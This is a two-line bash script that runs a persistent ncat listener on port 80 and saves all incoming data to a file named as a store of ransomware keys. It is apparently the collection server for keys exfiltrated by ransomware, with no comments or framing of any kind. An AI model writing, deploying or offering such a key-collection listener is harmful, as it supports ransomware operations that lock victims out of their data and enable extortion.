#!/bin/bash

ncat -k -l -p 80 | tee /opt/ransomware_mail/ransomw-keys.txt
